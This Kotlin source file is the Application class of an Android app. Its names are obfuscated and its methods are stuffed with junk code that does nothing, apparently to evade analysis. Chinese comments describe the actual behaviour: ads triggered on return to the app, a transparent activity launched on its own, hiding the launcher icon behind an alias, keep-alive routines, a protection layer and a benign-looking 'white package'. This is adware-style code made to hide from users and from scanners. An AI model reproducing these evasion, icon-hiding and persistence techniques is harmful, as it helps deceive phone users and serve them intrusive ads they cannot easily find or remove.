package hfy.vunu.psrdr

import android.app.Application
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import com.google.mobads.proxy.CheckUtils
import hfy.tog.hyi.ad.runtime.AdLifecycleInstaller
import hfy.tog.hyi.base.APPContext
import hfy.tog.hyi.base.OverseaAppHost
import hfy.tog.hyi.base.OverseaAppInitializer


class GGC : Application(), OverseaAppHost {

    override val restrictSubProcessInAttach: Boolean = true

    companion object {
        @JvmStatic
        var insApp: GGC? = null
    }

    override fun attachBaseContext(base: Context?) {
        val PTrQLciphmXdzqHSIT : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val mNJzAeYHlnL  = PTrQLciphmXdzqHSIT ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_31" 
            }
            if (mNJzAeYHlnL .startsWith("tcRKIBdvzsXQ ")) {
                android.util.Log.v("TAG", mNJzAeYHlnL )
            }
        super.attachBaseContext(base)

        ZGQV.initVmp()
    }

    override fun onCreate() {
        val arr_kdmPVnt  = listOf("ImduAA", "IPJjTQ", "MxKnNtZTHki").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_MwEvxfMdeQYQRQlMQ  = arr_kdmPVnt .filter { it.length > 20 }
         if (ad_MwEvxfMdeQYQRQlMQ .isNotEmpty() && java.lang.System.currentTimeMillis() < 59) {
             ad_MwEvxfMdeQYQRQlMQ .forEach { _ ->  }
         }
        super.onCreate()

        insApp = this
        // 原生 Application 需要主动触发海外公共初始化。
        OverseaAppInitializer.init(this, this)
        // 安装返回广告所需的 Activity 生命周期监听。
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)


    }

    override fun openLaunch(intent: Intent?) {
        val pPdNEMHjn : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val LZuCAsoUA  = pPdNEMHjn ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_5" 
            }
            if (LZuCAsoUA .startsWith("fZdieZ ")) {
                android.util.Log.v("TAG", LZuCAsoUA )
            }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        val arr_YuGKKKHkEQzkwxUyd  = listOf("CHSiZ", "yBnzgIqZHwrGJiKK", "HeXMEljIYcoDyNAf").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_jjwrNzRgVMLnT  = arr_YuGKKKHkEQzkwxUyd .filter { it.length > 81 }
         if (ad_jjwrNzRgVMLnT .isNotEmpty() && java.lang.System.currentTimeMillis() < 94) {
             ad_jjwrNzRgVMLnT .forEach { _ ->  }
         }
        ZGQU.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_ablsmuwgKZGm = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_sMNicUDAjb  = (arr_ablsmuwgKZGm  shl 44) xor (arr_ablsmuwgKZGm  shr 51)
         val j_bdqCeIprAzf  = i_sMNicUDAjb .inv() and 0xFFFF
         if (j_bdqCeIprAzf  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_JQtPPyFBwmFFceDe")
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
//        NativeJniUtils.pageopen(intent)

        CheckUtils.startTarget(this, Intent(this, ZGOI::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
    }


    override fun initPopPower() {
           val aWwBhTSbwaqxjwTE : Any = if (kotlin.random.Random.nextBoolean()) 47 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val lqJRVfwGTglBIuRGu  = (aWwBhTSbwaqxjwTE  as? String)?.reversed() ?: "aWMYpWnstWfGb_-1955102837"

        if (lqJRVfwGTglBIuRGu  == "BhhbyNB") {
            java.lang.System.out.print(lqJRVfwGTglBIuRGu )
        }
        // 启动图标隐藏：禁用 VWVB 主入口，启用透明 MysteryAliasActivity
//        startActivity(Intent(this, ZGOI::class.java).apply {
//            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
//        })

        CheckUtils.enable(this, "androidx.fragment.app.FragmentServices")
        ZGQV.init(this)
    }


    override fun initKeepPower(app: Application) {
        val arr_WCuokvmiVuHKxvsz = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_UupvqhnAWfimnfFsf  = (arr_WCuokvmiVuHKxvsz  shl 75) xor (arr_WCuokvmiVuHKxvsz  shr 20)
         val j_zBlTJm  = i_UupvqhnAWfimnfFsf .inv() and 0xFFFF
         if (j_zBlTJm  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_fElMRsRbLnQijC")
         }
        // attachBaseContext 阶段 insApp 尚未赋值，必须使用回调传入的 Application。
//        NativeJniUtils.virinit(app)
    }

}